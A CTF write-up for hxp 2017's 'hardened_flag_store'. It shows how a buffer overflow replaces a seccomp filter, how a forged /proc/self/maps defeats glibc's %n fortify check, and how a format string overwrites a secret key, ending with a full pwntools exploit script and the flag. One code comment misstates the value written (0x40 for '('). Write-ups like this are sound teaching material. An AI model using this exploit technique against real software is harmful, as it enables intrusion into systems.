# Writeup for hardened_flag_store (pwn, 300 + 20 pts, 15 solves), hxp CTF 2017

Description:

> finally a secure way to store my precious flogs
> Download: [2c020cca2c607610b33c8490653a6a420a86d89787278a7c72340833482ff4fd.tar.xz](https://2017.ctf.link/assets/files/2c020cca2c607610b33c8490653a6a420a86d89787278a7c72340833482ff4fd.tar.xz)
> Connection: nc 35.198.105.104 10000

## TL;DR

- using a buffer overflow, we load our own seccomp filter

- with a specific seccomp filter, we bypass glibc's hardening techniques

- we overwrite the secret key stored in memory and get the flag

## The Task

The target binary reads our input, installs a seccomp filter, and compares out input with a secret key. If the keys match, it opens and prints the flag; if not, it prints our input to stderr and jumps back to reading our input.

## The Bug

There's an obvious buffer overflow: we can input up to 96 bytes, which are read into a buffer of 32 bytes. Right after that buffer the seccomp filter is stored, so we can overwrite the filter and thus replace the first 8 seccomp instructions.

Apart from that, there's a fmtstr vulnerability: when we supply an incorrect key, our input is used as a format string to print to stderr; however, the binary is compiled with `_FORTIFY_SOURCE=2` and we cannot use `%n` without messing with glibc.

## The Exploit

When we use a `%n` in a format string, glibc reads `/proc/self/maps` to check if the format string is in read-only memory. If that fails, it complains `*** %n in writable segment detected ***` and `abort`s:

```
open("/proc/self/maps", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
read(3, "56134e97a000-56134e97c000 r-xp 0"..., 1024) = 1024
read(3, "                  /lib/x86_64-li"..., 1024) = 651
close(3)                                = 0
open("/dev/tty", O_RDWR|O_NOCTTY|O_NONBLOCK) = 3
writev(3, [{iov_base="*** %n in writable segment detec"..., iov_len=40}], 1) = 40
```

But we control the seccomp filter! Using the `ret ERRNO(0)` instruction, we can force any call to `open()` to return `0`, the file descriptor of stdin; libc then goes ahead and reads `/proc/self/maps` from standard input, so we can supply a fake memory map claiming that our input buffer is read-only.

The format string payload `%20c%20c%n` will write 0x00000028 to where the secret key is stored and thus overwrite it with "(".

One problem remains: when the binary opens the flag file, our seccomp filter makes the syscall return 0 again, and the binary reads the flag from stdin. To solve this, we filter by the first argument of the open syscall: if it points to the flag filename, we allow the call.

Putting everything together, we end up with the following exploit:

```python
from pwn import *

def bpf(op, jt, jf, k):
    return p16(op) + p8(jt) + p8(jf) + p32(k)

if __name__ == '__main__':

    r = remote('35.198.105.104', 10000)

    ld_1 = bpf(0x20, 0, 0, 0)
    jeq_1 = bpf(0x15, 4, 0, 3)
    jeq_2 = bpf(0x15, 0, 4, 2)
    ld_2 = bpf(0x20, 0, 0, 16)
    and_1 = bpf(0x54, 0, 0, 0xff)
    jeq_3 = bpf(0x15, 1, 0, 0x64)
    ret_errno = bpf(6, 0, 0, 0x00050000)
    ret_allow = bpf(6, 0, 0, 0x7fff0000)

    bpf_payload = ld_1 + jeq_1 + jeq_2 + ld_2 + and_1 + jeq_3 + ret_errno + ret_allow

    info("inject custom seccomp")
    r.send('A' * 32 + bpf_payload)

    info("trigger %n check")
    r.sendlineafter('Wrong secret :/\n', '%20c%20c%n')

    info("fake r-x memory")
    r.sendlineafter('Wrong secret :/\n', '000000000000-7fffffffffff r-xp 00000000 00:00 0                          /usr/bin/whatever')

    # we overwrote the secret key with 0x40 == '('
    info("enter secret key")
    r.sendline('(')

    r.recvuntil('hxp{')
    flag = 'hxp{' + r.recvuntil('}')
    info("flag: %s", flag)
```

Flag: `hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}`
